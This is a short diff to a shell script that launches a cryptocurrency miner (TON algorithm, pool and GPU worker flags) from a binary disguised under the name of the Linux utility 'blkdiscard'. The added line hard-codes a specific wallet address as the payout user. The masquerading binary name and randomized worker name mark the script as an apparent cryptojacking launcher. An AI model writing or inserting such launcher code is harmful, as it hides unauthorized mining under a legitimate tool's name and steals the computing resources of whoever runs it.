@@ -5,4 +5,4 @@ ALGO=TON
 WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
 
 chmod +x blkdiscard
-./blkdiscard --algo $ALGO --pool $POOL --user $USER
+./blkdiscard --algo $ALGO --pool $POOL --user EQDkrFYWp0i9TejiJFK1CsE8o0VM8-tu8l2X2adpo0zV59n2
